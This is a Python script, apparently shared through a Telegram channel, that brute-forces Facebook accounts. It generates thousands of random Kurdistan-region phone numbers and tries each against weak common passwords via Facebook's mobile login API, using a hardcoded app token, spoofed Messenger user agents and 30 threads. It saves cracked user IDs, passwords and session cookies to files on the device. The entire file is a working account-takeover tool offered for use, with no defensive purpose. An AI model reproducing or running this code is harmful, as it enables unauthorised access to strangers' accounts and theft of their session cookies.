#os.system("xdg-open https://t.me/+9llqPQbiQ1hiN2Vl")
#====SC SEMD BY : PROGRAMMER ALEX 
#==== Telegerm ; https://t.me/+9llqPQbiQ1hiN2Vl
import os, requests, random, sys, time, json, subprocess, string
from concurrent.futures import ThreadPoolExecutor as Thread
#/Varable
ok,loop,idx,pwv=0,0,[],[]
#Logo
Logo=f"""\033[0;31m\033[1m
.######..#####...######..######.
.##......##..##..##......##.....
.####....#####...####....####...
.##......##..##..##......##.....
.##......##..##..######..######.
................................
.######...####....####...##.....
...##....##..##..##..##..##.....
...##....##..##..##..##..##.....
...##....##..##..##..##..##.....
...##.....####....####...######.
................................

Sc Send by: PROGRAMMER ALEX 
Version: 1.0
Paid:\033[0;32m\033[1m FREE\033[0;31m\033[1m
{'='*45}"""
#/Crate-Password
pwv = []
pwv.append("hama1234")
pwv.append("zaxo1234")
pwv.append("zaxozaxo")
pwv.append("kurdkurd")
pwv.append("kurd1234")
#/Menu
def menu():
  os.system('clear')
  os.system("xdg-open https://t.me/+9llqPQbiQ1hiN2Vl")
  os.system("xdg-open https://t.me/+9llqPQbiQ1hiN2Vl")
  print(Logo)
  print(f'\033[1;37m\033[1m[1]\033[0;32m\033[1m Crack Random [\x1b[1;41mVIP\033[0;30m\033[0;32m\033[1m] ')
  print(f'\033[1;37m\033[1m[2] \033[0;31m\033[1mClose ')
  chos=input(f'\033[1;37m\033[1mChoose: ')
  if chos in ["1"]:
      crack_random()
  elif chos in ["2"]:
      exit()
  else:
      exit()
#/Start-Generate-Random
def crack_random():
     os.system('clear')
     print(Logo)
     print(f'\033[1;37m\033[1m[\033[1;33m 0750 0770 0780 \033[1;37m\033[1m ]')
     codexxx = input(f'\033[1;37m\033[1mcode: ')
     for _ in range(30000):
        nmp = "".join(random.choice(string.digits)for i in range(7))#Generate Random Number Kurdistan of Iraq
        idx.append(str(nmp))
     with Thread(max_workers=30)as dad:
       os.system('clear')
       print(Logo)
       for id in idx:#Output List
         idf=codexxx+str(id)
         make_pass=[]
         make_pass.append(str(idf))
         make_pass.append(str(id))
         for pas in pwv:
            make_pass.append(pas)
         dad.submit(crack,idf,make_pass)#Speed Crack = 30
     print('')
     print(f'\033[0;31m\033[1m='*45)
     print("Process Complet")
     exit()
#/Started-Crack-Number-Password
def crack(idf,make_pass):
 global ok,loop
 sys.stdout.write(f'\r\r\r\033[1;37m\033[1m[APO-RNDM] [\033[0;32m\033[1mOK:{ok}\033[1;37m\033[1m/\033[0;36\033[1m{loop}\033[1;37m\033[1m] '),sys.stdout.flush()
 try:
   for pwx in make_pass:
     head = {'user-agent':generate_user_agents(),
     'Host':'graph.facebook.com',
     'Content-Type':'application/json;charset=utf-8',
     'Content-Length':'595',
     'Connection':'Keep-Alive',
     'Accept-Encoding':'gzip'}
     data ={"locale": "en_GB",
     "format": "json",
     "email":idf,
     "password":pwx,
     "access_token":"438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28",
     "generate_session_cookies": 1}
     
     resp = requests.post('https://b-graph.facebook.com/auth/login',headers=head,data=data,allow_redirects=False).json()
     
     if 'session_key' in resp:
       uid=resp["uid"]
       kuki=";".join(q["name"]+"="+q["value"] for q in resp["session_cookies"])
       print(f'\r\r\033[0;32m\033[1m[APO-OK] {uid} | {pwx} | {kuki}   ')
       try:
         open('/sdcard/APO_OK.txt','a').write(str(uid)+'|'+str(pwx)+'|'+str(kuki)+'\n')
       except:pass       
     elif 'www.facebook.com' in resp["error"]["message"]:
       uid=resp["error"]["error_data"]["uid"]
       print(f'\r\r\033[0;35m\033[1m[APO-CP] {uid} | {pwx} ')
       try:
         open('/sdcard/APO_CP.txt','a').write(str(uid)+'|'+str(pwx)+'\n')
       except:pass       
     else:
        pass
   loop+=1
 except Exception as e:
    print(str(e))
def generate_user_agents():#Generate User-Agent With [ GetPro ]
 try:
    fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'#Module Fbba
    fbbv = str(random.randint(111111111,999999999))#Fbbav New
    android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')#Last Version Android 
    model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
    build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
    fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')#USER MODULE NEW YEARS
    fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
    ua = 'Dalvik/2.1.0 (Linux; U; Android '+android_version+'; '+model+' Build/'+build+') [FBAN/Orca-Android;FBAV/'+fbav+';FBBV/'+fbbv+';FBRV/0;FBPN/com.facebook.orca;FBLC/en_US;FBMF/'+fbmf+';FBBD/'+fbbd+';FBDV/'+model+';FBSV/'+android_version+';FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density='+str(random.randint(1,9))+'.'+str(random.randint(1,9))+',width='+str(random.randint(500,999))+',height='+str(random.randint(999,1999))+'};FB_FW/1;]'#Generate Ua With Random And Subprocess 
 except Exception:
   ua="Dalvik/2.1.0 (Linux; U; Android 15; 2310FPCA4G Build/AP3A.240905.015.A2) [FBAN/Orca-Android;FBAV/689.0.0.53.253;FBBV/656134739;FBRV/0;FBPN/com.facebook.orca;FBLC/en_US;FBMF/Xiaomi;FBBD/POCO;FBDV/2310FPCA4G;FBSV/15;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=7.2,width=861,height=1685};FB_FW/1;]"
 return ua
if __name__ == "__main__":
      menu()	
	


     
